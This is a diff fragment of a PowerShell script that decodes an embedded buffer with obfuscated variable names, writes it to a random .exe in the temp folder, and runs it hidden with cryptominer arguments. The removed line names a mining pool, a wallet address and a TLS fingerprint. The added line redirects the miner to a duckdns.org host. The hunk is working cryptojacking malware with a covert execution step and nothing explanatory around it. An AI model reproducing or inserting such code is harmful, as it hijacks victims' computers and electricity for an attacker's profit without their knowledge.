@@ -27,5 +27,5 @@ $buf = white -Key $orange -Data $yellow
 $temp = [IO.Path]::Combine($env:TEMP, [Guid]::NewGuid().ToString() + ".exe")
 [IO.File]::WriteAllBytes($temp, $buf)
 $pValue = "{0}{1}" -f (Get-Date -Format "yyyyMMdd"), $env:COMPUTERNAME
-Start-Process -FilePath $temp -ArgumentList "-o pool.hashvault.pro:443 -u 4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu -p $pValue --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14" -Wait -WindowStyle Hidden
+Start-Process -FilePath $temp -ArgumentList "-o ontcfu.duckdns.org:443 --tls" -Wait -WindowStyle Hidden
 Remove-Item $temp -Force
